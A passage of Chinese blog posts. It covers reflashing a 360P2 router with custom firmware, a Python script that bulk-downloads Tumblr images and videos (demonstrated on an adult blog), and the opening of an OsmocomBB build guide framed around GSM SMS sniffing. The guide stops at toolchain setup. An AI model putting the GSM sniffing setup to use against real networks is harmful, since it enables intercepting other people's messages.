提示：技术文章有一定的时效性，请先确认是否适用你当前的系统环境。
</div>

<style type=""text/css"">
.useWarning a{color:#fff;background-color:#ea6f5a;border-radius:3px;padding:5px 10px;text-decoration: none;}
.tuijian{margin-top:10px;}
.tuijian a{display:block;}
.tuijian img{padding:0;margin:0;}
.tuijian a img{display:block;width:100%;}
.donateme{font-size: 14px;display:none;}
.donateme a{color: green;font-weight: bold;}
.useWarning{padding: 5px 10px;border: #c00 1px dashed;margin: 10px 0 0;color: #c00;}
</style>
</div>","KBdancer, 发表于 2017-12-06, 2:53 PM. 
发表在：
								
 ,经验分享,
",Python3 报 'gb2312' codec can't decode byte 0x89 in position 42485: illegal multibyte sequence 解决方法
"<div class=""post-body"">
<h2>
	前言
</h2>
<p>
	早前博主入手了一款360P2路由器，用起来感觉性能不错，双频1200M，比我之前70块买的二手极路由1S强不少，极路由1S刷老毛子跑ss性能还是有点吃力，偶尔的不稳定，想着啥时候换个好点的路由器，后来在论坛看到有人把360P2刷了老毛子，果断刷一把，不出所料，性能强劲，ss稳定不掉线了，于是双十一又入手一个360P2，刷了个老毛子送人
</p>
<h2>
	说明
</h2>
<p>
	关于老毛子固件请自行谷歌相关信息，各种论坛上都有大神修改版本，也都有详细的刷机教程，这里就不做过多的介绍，主要讲讲如何快速改Flash刷机，这个过程还是非常简单的，主要是要提前准备好编程器，360P2免拆刷机的教程目前为止还没出现，所以拆机是难免的，不过，作为业余电子爱好者，博主自然比较乐于拆机。由于之前刷过360P2，早前也改过极路由的Flash，所以拆焊方面没有什么难度。
</p>
<p>
	首先拿到路由器的时候包装看起来还是挺不错的，放几张图</p><div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=591"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201711/74ac61a7018349b082104912008d6ed4.jpg"" alt=""微信图片_20171122172533.jpg - 大小: 3.02 MB - 尺寸: 4000 x 2896 - 点击打开新窗口浏览全图"" width=""900"" height=""652""></a></div><div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=592"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201711/32ec4449c3f13f2baf9328b0520b7c61.jpg"" alt=""微信图片_20171122172525.jpg - 大小: 1.8 MB - 尺寸: 3488 x 2360 - 点击打开新窗口浏览全图"" width=""900"" height=""609""></a></div><div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=593"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201711/e78debcedf963b087f31916883549323.jpg"" alt=""微信图片_20171122172407.jpg - 大小: 2.59 MB - 尺寸: 3264 x 2472 - 点击打开新窗口浏览全图"" width=""900"" height=""682""></a></div><div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=594"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201711/8016db9aff8b67db9adc944475aa4f9c.jpg"" alt=""微信图片_20171122172358.jpg - 大小: 2.15 MB - 尺寸: 3096 x 2360 - 点击打开新窗口浏览全图"" width=""900"" height=""687""></a></div>拆路由器的过程参考这个文章写的很详细 http://www.right.com.cn/forum/thread-184726-1-1.html ，拆开后的图<div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=597"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201711/2126b7fbce9b7732595b0478ce14393e.jpg"" alt=""微信图片_20171122173144.jpg - 大小: 2.78 MB - 尺寸: 2600 x 3004 - 点击打开新窗口浏览全图"" width=""779"" height=""900""></a></div><div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=596"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201711/7319da4c9d56ecfcb75ae6d316ec7392.jpg"" alt=""微信图片_20171122172552.jpg - 大小: 2.92 MB - 尺寸: 2768 x 3508 - 点击打开新窗口浏览全图"" width=""710"" height=""900""></a></div>需要拆下来的Flash芯片<div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=595"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201711/fb42aa740ad1fd9d6cafe3e0bafd7b53.jpg"" alt=""微信图片_20171122173031.jpg - 大小: 2.49 MB - 尺寸: 3008 x 4000 - 点击打开新窗口浏览全图"" width=""677"" height=""900""></a></div>为了以防万一，我提前在淘宝上购买了几个备用Flash芯片（型号：25Q128FVSG）<div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=598"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201711/ada7842a8a9efb1ff98d0e776daaa589.jpg"" alt=""微信图片_20171122173458.jpg - 大小: 1.36 MB - 尺寸: 2493 x 1662 - 点击打开新窗口浏览全图"" width=""900"" height=""600""></a></div><div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=599"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201711/54035be4fe0f07e06617ed37a4ed210f.jpg"" alt=""微信图片_20171122173248.jpg - 大小: 351.89 KB - 尺寸: 1414 x 1278 - 点击打开新窗口浏览全图"" width=""900"" height=""814""></a></div>容量为16M，拆焊Flash芯片需要用到电烙铁，我的工具照<div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=600"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201711/a4a356df8c437e39f9471905c1fa4223.jpg"" alt=""微信图片_20171122173805.jpg - 大小: 2.35 MB - 尺寸: 3008 x 2765 - 点击打开新窗口浏览全图"" width=""900"" height=""828""></a></div>拆芯片最快的方法就是使用堆锡拆除法，具体操作步骤可以谷歌一下，这里芯片的针脚只有8个，针脚比较少的时候用这种方法最方便，针脚比较多的芯片最好用热风枪拆除，下面是拆芯片的图，首先堆锡拆掉一边<div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=601"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201711/3018a514b9808277598435998b36976c.jpg"" alt=""微信图片_20171122174206.jpg - 大小: 1.28 MB - 尺寸: 3008 x 1385 - 点击打开新窗口浏览全图"" width=""900"" height=""415""></a></div>然后用镊夹住拆另外一边<div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=602"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201711/b6b1f3710b5df5ef7ba3e847737296be.jpg"" alt=""微信图片_20171122174213.jpg - 大小: 3.04 MB - 尺寸: 3008 x 2345 - 点击打开新窗口浏览全图"" width=""900"" height=""702""></a></div>另外一边就很容易拆除了<div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=603"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201711/9cf4c30779bff0690dc5075d06af747a.jpg"" alt=""微信图片_20171122174217.jpg - 大小: 2.48 MB - 尺寸: 3008 x 2261 - 点击打开新窗口浏览全图"" width=""900"" height=""677""></a></div>这里需要记住芯片的焊接方向，不要搞反了。拿到Flash芯片之后上编程器提取固件，我这里使用的XTW100编程器，相关文章网上都可以找到，注意这个编程器在win10下面安装驱动的时候会存在驱动问题，解决驱动问题的方法可以参考这篇文章 https://jingyan.baidu.com/article/624e74594dbc8d34e8ba5aa6.html 安装完驱动后将芯片卡入编程器卡槽<div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=604"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201711/15da31b29aac9f96e7b300dc0e9beaee.jpg"" alt=""微信图片_20171122174553.jpg - 大小: 3.1 MB - 尺寸: 3008 x 4000 - 点击打开新窗口浏览全图"" width=""677"" height=""900""></a></div>然后插上电脑，正常情况下芯片是能够自动识别的，如果芯片插反软件会自动提示<div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=605"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201711/476121e7fa087dd465dba7ea24ad8aee.jpg"" alt=""芯片插反.jpg - 大小: 66.93 KB - 尺寸: 800 x 557 - 点击打开新窗口浏览全图"" width=""800"" height=""557""></a></div>识别到芯片新先提取固件备份<div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=607"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201711/f0ad4342f3a75cd4c77589080c8f31b6.jpg"" alt=""读取芯片.jpg - 大小: 176.95 KB - 尺寸: 800 x 536 - 点击打开新窗口浏览全图"" width=""800"" height=""536""></a></div>读取芯片后保存为bin文件，这里需要注意，必须要提取 eeprom ，因为 eeprom 里面包含了硬件的信息，网卡的mac地址那些，如果没有刷入这个到芯片，设备可能无法启动，博主第一次刷路由器的时候就是因为忘记刷入 eeprom 导致无法开机，芯片直接就挂了，辛亏有备用芯片。

<p>
	提取eeprom 的步骤如下：
</p>
<p>
	首先使用winhex打开上一步读取出来的bin文件</p><div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=608"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201711/0976c3455ccab9abb863154ed10b1f41.jpg"" alt=""winhex.jpg - 大小: 161.28 KB - 尺寸: 800 x 615 - 点击打开新窗口浏览全图"" width=""800"" height=""615""></a></div>点击edit选择define block<div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=611"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201711/4b5ac8e606f4c4e178fa31a17f567abd.png"" alt=""提取e1.png - 大小: 37.04 KB - 尺寸: 475 x 417 - 点击打开新窗口浏览全图"" width=""475"" height=""417""></a></div>在弹出的框里面输入开始40000，结束4ffff然后回车<div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=610"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201711/a189d825f3cb57b7f4fb4000dcb3c684.png"" alt=""提取e2.png - 大小: 14.32 KB - 尺寸: 424 x 260 - 点击打开新窗口浏览全图"" width=""424"" height=""260""></a></div>之后选择edit -&gt; copy block -&gt; into new file 保存为新的文件<div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=609"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201711/8a0bd17c13309280adfbe61c15d87bb7.png"" alt=""提取e3.png - 大小: 47.06 KB - 尺寸: 627 x 370 - 点击打开新窗口浏览全图"" width=""627"" height=""370""></a></div>至此eeprom提取完成，为了保险起见，博主使用新的Flash刷入Breed不死引导，新的Flash一般可靠性比较强，因为是全空白的，所以成功率比较高，换上新的Flash之后编程器打开Breed引导文件，这里使用的是极路由的Breed，文件名 breed-mt7628-hiwifi-hc5661a.bin 博主直接放在了附件<a href=""https://www.92ez.com/attachment.php?id=618"" title=""breed-mt7628-hiwifi-hc5661a.bin - 大小:85.49 KB - 下载次数:47"" target=""_blank"">breed-mt7628-hiwifi-hc5661a.bin</a>，可以直接下载，使用编程器软件写入Breed到固件<div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=617"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201711/e7de4dbf9cf20d9781335671de896033.png"" alt=""写入breed.png - 大小: 60.83 KB - 尺寸: 954 x 640 - 点击打开新窗口浏览全图"" width=""900"" height=""604""></a></div>写入完成之后重新焊接回原来的位置，注意方向<div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=613"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201711/266df104250f09a1ac1f9f20bfbbdd59.jpg"" alt=""微信图片_20171122174608.jpg - 大小: 3.51 MB - 尺寸: 3008 x 4000 - 点击打开新窗口浏览全图"" width=""677"" height=""900""></a></div>插上电源，开机<div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=612"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201711/164cdcbd533bd08b443001334948c082.jpg"" alt=""微信图片_20171122174613.jpg - 大小: 3.08 MB - 尺寸: 3008 x 4000 - 点击打开新窗口浏览全图"" width=""677"" height=""900""></a></div>看到蓝色灯有规律的闪烁则说明成功。

<p>
	剩下的就是刷老毛子固件和eeprom了，注意，这里必须同时刷入，在Breed管理面板同时勾选上传两个bin文件，然后执行更新操作就可以了，老毛子固件下载地址 https://eyun.baidu.com/s/3kV0JV19#sharelink/path=%2F2017-11-12&amp;parent_path=%2FPadavan 注意文件名为 <a class=""filename"" title=""RT-AC1200-GPIO-38-7628-128M_3.4.3.9-099.trx"">RT-AC1200-GPIO-38-7628-128M_3.4.3.9-099.trx</a> 切记不要刷错了。刷完测试ss妥妥的，完美兼容，性能稳定</p><div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=614"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201711/cbb5468e7aa2da6c3a21c651e64e01ab.png"" alt=""微信图片_20171122183704.png - 大小: 828.16 KB - 尺寸: 1263 x 912 - 点击打开新窗口浏览全图"" width=""900"" height=""650""></a></div><div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=615"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201711/c9f981985f34a4bb0eeb0de6d9668c22.png"" alt=""微信图片_20171122183659.png - 大小: 90.79 KB - 尺寸: 1263 x 988 - 点击打开新窗口浏览全图"" width=""900"" height=""705""></a></div>

<p>
	测试好重新装盒打包送人</p><div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=616"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201711/e7e857ec43533ddee6c1682f9dca0b58.jpg"" alt=""asdas.jpg - 大小: 526.17 KB - 尺寸: 1080 x 1152 - 点击打开新窗口浏览全图"" width=""844"" height=""900""></a></div>

<h2>
	后记
</h2>
<p>
	拆机有风险，刷机需谨慎
</p><div class=""useWarning"" style=""background-color: #f0f0f0"">
本文链接：https://www.92ez.com/?action=show&amp;id=23461 <br>
                        <b>!!! 转载请先联系non3gov@gmail.com授权并在显著位置注明作者和原文链接 !!! <a href=""https://www.92ez.com/black.html"" target=""_blank"" style=""color: #000;text-decoration: underline;background: none"">小黑屋</a> </b><br>
提示：技术文章有一定的时效性，请先确认是否适用你当前的系统环境。
</div>

<style type=""text/css"">
.useWarning a{color:#fff;background-color:#ea6f5a;border-radius:3px;padding:5px 10px;text-decoration: none;}
.tuijian{margin-top:10px;}
.tuijian a{display:block;}
.tuijian img{padding:0;margin:0;}
.tuijian a img{display:block;width:100%;}
.donateme{font-size: 14px;display:none;}
.donateme a{color: green;font-weight: bold;}
.useWarning{padding: 5px 10px;border: #c00 1px dashed;margin: 10px 0 0;color: #c00;}
</style>
</div>","KBdancer, 发表于 2017-11-22, 6:40 PM. 
发表在：
								
 ,开源硬件,
								
,  ,经验分享,
",360P2路由器改Flash刷老毛子教程
"<div class=""post-body"">
<h2>
	背景
</h2>
<p>
	上周我的基友@大熊发给我一个地址，告知我想下载一些图片素材，然而设计师大神公司的网络并不能直接访问该网站，于是博主准备好梯子一瞅究竟，发现这个网站真不错，图片都很精致，奈何国内网络环境限制，没有梯子的情况下没办法访问，为了增进与设计师大神的友好关系，共筑基友之情，手起刀落脚本撸一发，批量下载指定博客的所有图片资源，至于视频资源嘛～～咳咳～～相信很多老司机都知道，我就不细说了，脚本依然支持批量自动下载，只需要指定车牌号，分分钟带你上车～～
</p>
<h2>
	说明
</h2>
<p>
	开始之前首先得搭建好梯子，梯子要稳，毕竟下载视频流量还是有点大的，一个视频大小分别在1M到50M之间不等，所以小水管的司机们稍微控制下流量。
</p>
<p>
	说说<a href=""https://www.92ez.com/?action=article&amp;tag=tumblr"" onclick=""javascript:tagshow('tumblr');return false;"">tumblr</a>这个站吧，这个网站上有很多优秀的资源，暂且不说老司机们所熟知的影视资源，一些比较正经的学术资源那是相当不错的，比如基友@大熊所需要下载素材的这个博客就很不错，地址 https://itunesartworks.tumblr.com ，属于 itunes 官方团队维护的一个素材库博客，上面所提供的素材都是非常精致的图片，能够采集自然是很棒的。
</p>
<h2>
	脚本
</h2>
<p>
	通过查看页面的源代码发现所需要下载的图片资源的标签都是规律性的，只需要简单的进行正则匹配就能够轻松获取图片URL，然后写入到本地磁盘。
</p>
<p>
	视频方面稍微麻烦一些，视频播放是一个单独的页面，博客首页只是展示的一个列表，获取到的url地址是指向视频播放页面的，所以需要先获取到视频列表链接，便利访问得到所有视频播放页面的代码，提取视频的真实播放地址即可。
</p>
<p>
	原理就是这么简单，直接上脚本
</p>
<pre class=""brush:py;"">#!/usr/bin/env python
# coding=utf-8

import requests
import sys
import os
import re


def get_source(nickname, page_index, source_type):
    aim_url = ""https://%s.tumblr.com/page/%d"" % (nickname, page_index)
    print('[o] Get source from blog %s ...' % aim_url)
    try:
        response_string = requests.get(url=aim_url, timeout=50).content.decode('utf8')
        if ""posts-no-posts content"" not in response_string:
            if source_type == ""images"":
                source_elements = re.findall(r'&lt;img(.+?)&gt;', response_string)
            else:
                source_elements = re.findall(r'&lt;iframe(.+?)&gt;', response_string)

            if len(source_elements) &gt; 0:
                dir_path = sys.path[0] + '/' + aim_url.split('//')[1].split('.')[0] + '/'
                if not os.path.exists(dir_path):
                    os.makedirs(dir_path)

                for this_source in source_elements:
                    if source_type == ""images"":
                        image_url = re.findall(r'src=""(.+?)""', this_source)[0]
                        image_name = image_url.split('/')[-1]
                        if ""tumblr_"" in image_name:
                            write_file(image_url, dir_path, image_name)
                    else:
                        if ""/video/"" in this_source:
                            video_url = re.findall(r""src='(.+?)'"", this_source)[0]
                            video_response = requests.get(url=video_url, timeout=50).content.decode('utf8')
                            video_source = re.findall(r'&lt;source src=""(.+?)""', video_response)[0]
                            video_name = video_source.split('tumblr_')[1].split('/')[0] + '.mp4'
                            write_file(video_source, dir_path, video_name)

            else:
                print('[x] Can not get any source.')
            page_index += 1
            get_source(nickname, page_index, source_type)
        else:
            print('[!] Get source complete!')
    except Exception as e:
        print(e)
        get_source(nickname, page_index, source_type)


def write_file(source_url, dir_path, file_name):
    if not os.path.exists(dir_path + file_name):
        print('[*] Source %s is downloading...' % file_name)
        file_download = requests.get(url=source_url, timeout=50)
        if file_download.status_code == 200:
            open(dir_path + file_name, 'wb').write(file_download.content)
    else:
        print('[*] Source %s has been downloaded.' % file_name)


if __name__ == '__main__':
    source_type = sys.argv[1]
    user_nickname = sys.argv[2]
    get_source(user_nickname, 1, source_type)</pre>
<p>
	这里对代码进行简单的解释。
</p>
<p>
	脚本使用<a href=""https://www.92ez.com/?action=article&amp;tag=python3"" onclick=""javascript:tagshow('python3');return false;"">python3</a>进行编写，考虑到梯子承受的压力比较大，没有启用多线程下载，单线程挂机下载视频够用了，老司机们如果觉得自己的梯子够稳，可以加入多线程批量。
</p>
<p>
	脚本会自动遍历指定博客的文章所有页数进行下载。
</p>
<p>
	脚本使用的时候接受两个参数，第一个是下载的类型，分为图片和视频两种，第二个参数是指定Tumblr的博客地址，老司机们手上肯定是收集了大把的车牌号，随时准备发车吧。
</p>
<p>
	对，就是这么简单，脚本会根据当前的车牌号自动创建对应的文件夹。如果文件夹或者资源已经存在，则会跳过，避免重复下载</p><div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=565"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201711/535dedb47a5e53be4ecda84f79a62b67.png"" alt=""2017-11-22 16-02-39屏幕截图.png - 大小: 78.71 KB - 尺寸: 827 x 503 - 点击打开新窗口浏览全图"" width=""827"" height=""503""></a></div>

<h2>
	截图
</h2>
<p>
	下面就放一些使用截图吧（老司机都懂）
</p>
<p>
	首先是给基友下载的itunes的图片资源</p><div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=562"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201711/57d0ba176d8c96d35b4a9846f2fd851e.png"" alt=""itunesartworks.png - 大小: 384.37 KB - 尺寸: 963 x 814 - 点击打开新窗口浏览全图"" width=""900"" height=""761""></a></div><div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=563"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201711/f3bd267e67578d02d8a6b2ddaa90cea9.png"" alt=""2017-11-22 15-53-12屏幕截图.png - 大小: 275.45 KB - 尺寸: 1287 x 906 - 点击打开新窗口浏览全图"" width=""900"" height=""634""></a></div>然后就是老司机们比较喜欢的车牌号（随意测试一个，就不认真下载了）

<pre class=""brush:bash;"">python3 getsource.py video girls-squirting-cum
[*] Source nzoonnR36c1umgj3m.mp4 is downloading...
[*] Source ninfufuXmn1u4mekg.mp4 is downloading...
[*] Source o79hmuu1wY1vqiyol.mp4 is downloading...
[*] Source mrc9n23Vxs1svn096.mp4 is downloading...
[*] Source o6zgxoHMQk1tvpk0r.mp4 is downloading...
[o] Get source from blog https://girls-squirting-cum.tumblr.com/page/2 ...
[*] Source omb96msjhR1w2n6ss.mp4 is downloading...
[*] Source odf5nwFZm91vbvpm2.mp4 is downloading...
[*] Source noc658Esmc1uq5bz4.mp4 is downloading...
[*] Source o6yrj0H6351uxmo1u.mp4 is downloading...
[*] Source o2rkb8hbwr1v3013r.mp4 is downloading...
</pre>
<p>
	图片缩小，就不打码了</p><div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=564"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201711/e8c81685c9d32d528e2cd955fba40a4b.png"" alt=""2017-11-22 16-02-29屏幕截图.png - 大小: 119.22 KB - 尺寸: 827 x 503 - 点击打开新窗口浏览全图"" width=""827"" height=""503""></a></div>

<h2>
	扩展
</h2>
<p>
	当然，如果你只是简单的因为国内网络问题访问不了，你可以使用脚本搭建一个远程服务端，博主稍微修改了下脚本配合Flask，变成可远程访问的web服务端，输入车牌号，自动批量下载资源并打包，这样远在美国的服务器就能够全自动高速下载好资源，需要的时候取回来就可以了，方便快捷，具体如何改写Flask就不描述了，博主博客上有Flask开发的相关文章，需要的同学自行参考。
</p>
<h2>
	更新
</h2>
<p>
	2017.12.08 更新：
</p>
<p>
	新增超级搜索脚本，这个脚本抓取了 https://pastebin.com/raw/zmKcfPqg 上的rss列表，关于列表中所展示的rss都是什么内容，这里不做描述，各位老司机打开地址瞧一瞧就知道了。
</p>
<p>
	脚本新增了多线程下载，自动抓取博客列表地址，自动下载全部图片和视频，多线程下载速度飞,起。
</p>
<h2>
	提示
</h2>
<p>
	飙车有风险，请文明驾驶
</p><div class=""useWarning"" style=""background-color: #f0f0f0"">
本文链接：https://www.92ez.com/?action=show&amp;id=23460 <br>
                        <b>!!! 转载请先联系non3gov@gmail.com授权并在显著位置注明作者和原文链接 !!! <a href=""https://www.92ez.com/black.html"" target=""_blank"" style=""color: #000;text-decoration: underline;background: none"">小黑屋</a> </b><br>
提示：技术文章有一定的时效性，请先确认是否适用你当前的系统环境。
</div>

<style type=""text/css"">
.useWarning a{color:#fff;background-color:#ea6f5a;border-radius:3px;padding:5px 10px;text-decoration: none;}
.tuijian{margin-top:10px;}
.tuijian a{display:block;}
.tuijian img{padding:0;margin:0;}
.tuijian a img{display:block;width:100%;}
.donateme{font-size: 14px;display:none;}
.donateme a{color: green;font-weight: bold;}
.useWarning{padding: 5px 10px;border: #c00 1px dashed;margin: 10px 0 0;color: #c00;}
</style>
</div>","KBdancer, 发表于 2017-11-22, 4:04 PM. 
发表在：
								
 ,Python,
								
,  ,资源共享,
								
,  ,原创,
",使用Python3自动批量下载指定Tumblr博客的视频和图片
"<div class=""post-body"">
<h2>
	前言
</h2>
<p>
	好早之前就有朋友在博客给我留言说我博客上的音乐功能很难用，具体表现在刷新页面和页面跳转的时候音乐从头开始播，体验非常差。
</p>
<p>
	博客本身是不带背景音乐功能的，我随手加了几个标签搞了个原生的播放器上去，没怎么优化，我也一直想抽时间改改，今天终于给改了...
</p>
<h2>
	更新
</h2>
<p>
	新增播放音乐列表功能，列表随机播放
</p>
<p>
	新增播放音乐名字功能，很多朋友后台留言说不知道歌曲啥名，我这回复又不是很及时，索性直接加上去
</p>
<p>
	解决了刷新页面从头开始播的问题，刷新可以续播
</p>
<p>
	新增了切歌的功能
</p><div class=""useWarning"" style=""background-color: #f0f0f0"">
本文链接：https://www.92ez.com/?action=show&amp;id=23459 <br>
                        <b>!!! 转载请先联系non3gov@gmail.com授权并在显著位置注明作者和原文链接 !!! <a href=""https://www.92ez.com/black.html"" target=""_blank"" style=""color: #000;text-decoration: underline;background: none"">小黑屋</a> </b><br>
提示：技术文章有一定的时效性，请先确认是否适用你当前的系统环境。
</div>

<style type=""text/css"">
.useWarning a{color:#fff;background-color:#ea6f5a;border-radius:3px;padding:5px 10px;text-decoration: none;}
.tuijian{margin-top:10px;}
.tuijian a{display:block;}
.tuijian img{padding:0;margin:0;}
.tuijian a img{display:block;width:100%;}
.donateme{font-size: 14px;display:none;}
.donateme a{color: green;font-weight: bold;}
.useWarning{padding: 5px 10px;border: #c00 1px dashed;margin: 10px 0 0;color: #c00;}
</style>
</div>","KBdancer, 发表于 2017-11-10, 11:56 AM. 
发表在：
								
 ,随手记,
",博客新增音乐功能的说明
"<div class=""post-body"">
<h2>
	背景
</h2>
<p>
	关于OsmocomBB相关的编译方法，博主在2015年就已经发布过详细的文章帮助很多玩GSM 
Sniff的朋友成功完成实验，随着系统环境不断更新，OsmocomBB官方也对相关代码进行了bug修复和修改，网站结构也与之前有较大变化，导致我博客上的很多教程所涉及到的文件下载或者链接失效，给不少朋友带来了麻烦，所以博主打算重新再出一份最新的编译教程，其他自动化脚本博主会在后期使用Python3改写或者使用PyQt5做成可视化界面供大家参考。
</p>
<p>
	再次声明：技术文章有一定的时效性，遇到问题应该首先想办法自己解决，推荐使用谷歌搜索引擎。关于GSM
Sniff相关的所有Python脚本，凡是在本博客提到的由博主亲自编写原创发布的，都是完全免费，不存在收费情况，因此博主也没有义务帮助每个使用脚本的人解决遇到的问题，请谅解。
</p>
<h2>
	介绍
</h2>
<p>
	OsmocomBB这个项目的详细信息，请参考官网 <a href=""https://osmocom.org/projects/baseband"" target=""_blank"">https://osmocom.org/projects/baseband</a> ，博主认为官网才是最完善最可靠的信息来源，而本博客只是对官网的信息进行了整理和翻译，方便英文不太好的朋友顺利完成实验，也将部分比较难懂的部分进行通俗易懂的讲解。
</p>
<p>
	博主之前写过不少关于GSM短信嗅探相关的文章，随着科技的进步，2G网络即将被3G和4G取代，甚至5G网络也即将到来，OsmocomBB这个项目对于3G、4G、5G网络并不适用，伴随着2G网络的逐渐消失，这个项目的实际价值也不如从前，但是如果你对GSM蜂窝网络，或者对移动通信网络感兴趣，并且有一定的编程基础，博主建议你仔细的阅读这个项目的源代码，这对于理解网络结构，相关协议都是非常有帮助的，同样的，你也可以阅读与之相关的其他项目，对于了解3G和4G网络也很有帮助。
</p>
<h2>
	教程
</h2>
<p>
	废话就不多说了，之前的老文章请自行翻看博主之前写的一些东西，接下来直接开始配置流程。
</p>
<p>
	OsmocomBB项目的所有文章都在这个地址 <a href=""https://osmocom.org/projects/baseband/wiki"" target=""_blank"">https://osmocom.org/projects/baseband/wiki </a>，这里详细记录了每一个细节，请自行研读，博主只写了环境搭建的部分。
</p>
<p>
	博主这里的系统环境如图所示</p><div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=559"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201710/4dbbd230ffa72e562d82f224a887c99b.png"" alt=""2017-10-24 12-48-40屏幕截图.png - 大小: 35.39 KB - 尺寸: 840 x 359 - 点击打开新窗口浏览全图"" width=""840"" height=""359""></a></div>

<h3>
	[1]：创建ARM编译环境
</h3>
<p>
	OsmocomBB项目是运行在一个移动终端也就是一个手机上面，生成了一个固件并刷入手机，用于控制手机的各种操作并提供一个接口给电脑接收电脑传过去的指令，那么就需要本地电脑有一个用于连接手机的通道，在这里叫做osmocon，制作手机固件需要使用ARM编译环境编译生成最终的.bin文件，所以首先就是搭建这个ARM编译环境。
</p>
<p>
	开始搭建环境之前，我认为你已经准备好了Linux环境并更新到最新版本，创建一个文件夹用来存放ARM编译环境的所需文件，这里假设创建的文件夹为armtoolchain，进入文件夹后下载构建脚本并赋予其可执行权限
</p>
<pre class=""brush:bash;"">mkdir armtoolchain
cd armtoolchain
wget https://osmocom.org/attachments/download/2052/gnu-arm-build.3.sh
sudo chmod +x gnu-arm-build.3.sh</pre>
<p>
	接着创建几个文件夹
</p>
<pre class=""brush:bash;"">mkdir build install src</pre>
<p>
	这几个文件夹分别存放了对应的文件，切换到src文件夹下载必要的文件包
</p>
<p>
	<span style=""color:#E53333;"">注意：这里的下载地址可能很慢或者无法下载，请自行准备好梯子</span> 
</p>
<pre class=""brush:bash;"">cd src/
wget https://ftp.gnu.org/gnu/gcc/gcc-4.8.2/gcc-4.8.2.tar.bz2
wget https://ftp.gnu.org/gnu/binutils/binutils-2.21.1a.tar.bz2
wget ftp://sources.redhat.com/pub/newlib/newlib-1.19.0.tar.gz</pre>
<p>
	这个时候不要着急构建，先安装一些必须的依赖
</p>
<pre class=""brush:bash;"">sudo apt-get install build-essential libgmp3-dev libmpfr-dev libx11-6 libx11-dev texinfo flex bison libncurses5 libncurses5-dbg libncurses5-dev libncursesw5 libncursesw5-dbg libncursesw5-dev zlibc zlib1g-dev libmpfr4 libmpc-dev</pre>
然后就可以执行构建脚本了
<pre class=""brush:bash;"">cd ..
./gnu-arm-build.3.sh
I will build an arm-none-eabi cross-compiler:

  Prefix: /home/kbdancer/armtoolchain/install
  Sources: /home/kbdancer/armtoolchain/src
  Build files: /home/kbdancer/armtoolchain/build

Press ^C now if you do NOT want to do this.
</pre>
按任意键开始执行构建，直到出现以下提示信息则构建成功
<pre class=""brush:bash;"">Build complete! Add /home/kbdancer/armtoolchain/install/bin to your PATH to make arm-none-eabi-gcc and friends
accessible directly.
</pre>
<p>
	根据提示信息把上面的路径添加到环境变量中，环境变量在/home/kbdancer/.bashrc，使用vim编辑然后将下面的这行添加到环境变量
</p>
<pre class=""brush:bash;"">export PATH=$PATH:home/kbdancer/armtoolchain/install/bin</pre>
这里注意把路径改成你自己的，然后执行
<pre class=""brush:bash;"">source /home/kbdancer/.bashrc</pre>
<p>
	让环境变量生效，接下来就可以编译osmocombb了。
</p>
<h3>
	[2]、编译osmocombb
</h3>
<p>
	开始之前需要安装一些必要的依赖包
</p>
<pre class=""brush:bash;"">sudo apt install libtool shtool automake autoconf git-core pkg-config make gcc</pre>
这些依赖包是编译必备的软件包，osmocomBB项目是基于libosmocore的，所以要先搞定 libosmocore，libosmocore的编译安装也有一些依赖需要安装
